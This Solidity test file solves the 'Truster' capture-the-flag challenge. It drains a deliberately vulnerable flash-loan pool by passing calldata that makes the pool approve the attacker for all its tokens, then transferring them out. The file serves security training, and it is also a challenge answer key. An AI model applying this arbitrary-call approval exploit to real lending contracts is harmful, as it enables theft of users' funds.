// SPDX-License-Identifier: UNLICENSED
// More and more lending pools are offering flash loans. In this case, a new pool has launched
// that is offering flash loans of DVT tokens for free.
// Currently the pool has 1 million DVT tokens in balance. And you have nothing.
// But don't worry, you might be able to take them all from the pool. In a single transaction.
pragma solidity 0.8.10;

import {BaseTest} from "../BaseTest.sol";
import "../../truster/TrusterLenderPool.sol";
import "../../DamnValuableToken.sol";

contract TrusterTest is BaseTest {

    uint TOKENS_IN_POOL = 1000000 ether;

    TrusterLenderPool pool;
    DamnValuableToken token;

    // attacker adddress
    address payable attacker;

    constructor() {
        // setup the needed user accordly
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";
        preSetup(1, labels);
    }

    function setUp() public override {
        super.setUp();
        attacker = users[0];
        
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(address(token));

        token.approve(address(pool), TOKENS_IN_POOL);
        token.transfer(address(pool), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), 0);
    }


    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */
        // Call the flashLoan then the TrusterLenderPool.sol::target.functionCall() will be called with
        // malicious encodeWithSignature;
        uint256 poolBalance = token.balanceOf(address(pool));
        vm.prank(attacker);
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            poolBalance
        );
        pool.flashLoan(0, attacker, address(token), data);
        vm.prank(attacker);
        token.transferFrom(address(pool), attacker, poolBalance);
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */
        // The pool has now 0 tokens in balance
        assertEq(token.balanceOf(address(pool)), 0 ether);
    }
}